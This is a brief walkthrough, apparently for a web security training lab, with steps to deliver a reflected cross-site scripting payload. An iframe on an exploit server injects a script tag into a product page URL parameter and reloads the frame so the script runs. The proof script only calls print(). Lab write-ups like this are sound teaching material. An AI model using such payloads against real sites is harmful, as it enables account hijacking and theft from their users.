
1. Click on any post, verify the following code

![](/static/img/Pasted_image_20231121124357.png)

2. Add the following payload inside exploit sever;

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

